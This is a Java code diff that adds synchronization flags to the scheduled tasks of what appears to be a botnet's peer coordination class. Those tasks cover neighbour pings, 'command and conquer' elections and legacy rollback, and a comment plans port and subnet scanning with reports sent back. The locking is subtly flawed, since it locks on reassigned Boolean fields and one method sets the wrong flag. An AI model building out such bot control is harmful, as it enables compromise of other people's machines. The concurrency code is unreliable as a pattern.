@@ -31,36 +31,92 @@ public class ScheduledTasksNet {
 	private Config configEngine;
 	@Autowired
 	private Behavior botB;
-	
+
+	private Boolean flagELection = false;
+	private Boolean flagNeighbours = false;
+	private Boolean flagLegacy = false;
+
+	@Scheduled(initialDelay = 100000, fixedRate = 60000)
+	public void pingNeighbours() {
+		synchronized (flagLegacy) {
+			if (flagLegacy == false)
+				synchronized (flagELection) {
+					if (flagELection == false) {
+						synchronized (flagNeighbours) {
+							flagNeighbours = true;
+						}
+						botB.pingToNeighbours();
+						synchronized (flagNeighbours) {
+							flagNeighbours = false;
+						}
+
+					}
+				}
+		}
+	}
+
+	@Scheduled(initialDelay = 140000, fixedRate = 120000)
+	public void electionDay() {
+		synchronized (flagLegacy) {
+			if (flagLegacy == false)
+				synchronized (flagNeighbours) {
+					if (flagNeighbours == false)
+						if (configEngine.isCommandandconquerStatus()) {
+							synchronized (flagELection) {
+								flagNeighbours = true;
+							}
+							cmm.startElection();
+							synchronized (flagELection) {
+								flagNeighbours = false;
+							}
+						}
+				}
+		}
+	}
+
+	@Scheduled(initialDelay = 180000, fixedRate = 60000)
+	public void rollBack() {
+		synchronized (flagELection) {
+			synchronized (flagNeighbours) {
+				if (flagELection == false) {
+					if (flagNeighbours == false) {
+						if (!configEngine.isCommandandconquerStatus()) {
+							if (nServ.getCounterCeCMemory() == 1) {
+								synchronized (flagLegacy) {
+									flagLegacy = true;
+								}
+								cmm.legacy();
+							}
+						}
+					}
+				}
+			}
+		}
+
+	}
+
+	public Boolean setLegacy(Boolean newLegacy){
+		synchronized (flagLegacy) {
+			flagLegacy=newLegacy;
+			return true;
+		}
+		
+		
+	}
 
 	
-	@Scheduled(initialDelay=100000,fixedRate = 60000)
-	public void pingNeighbours() {
-			botB.pingToNeighbours();
-	}
 	
-	
-	@Scheduled(initialDelay=140000, fixedRate = 120000)
-	public void electionDay() {
-		if (configEngine.isCommandandconquerStatus()){
-			cmm.startElection();
+	public Boolean getLegacy(){
+		synchronized (flagLegacy) {
+			return flagLegacy;
 		}
+		
+		
 	}
-	
-	
-	@Scheduled(initialDelay=180000, fixedRate = 60000)
-	public void rollBack() {
-		if (!configEngine.isCommandandconquerStatus()){
-				if(nServ.getCounterCeCMemory()==1)
-					cmm.legacy();
-		}
-	}
-	
-	
+
 	@Scheduled(fixedRate = 500000)
 	public void pingVicinato() {
 
-	
 		log.info("The time is now {}", dateFormat.format(new Date()));
 	}
 
@@ -72,6 +128,5 @@ public class ScheduledTasksNet {
 	// eseguire chiamate
 
 	// Scan porte e sottorete + invio report?= sarebbe sgravo se fatto
-
 
 }
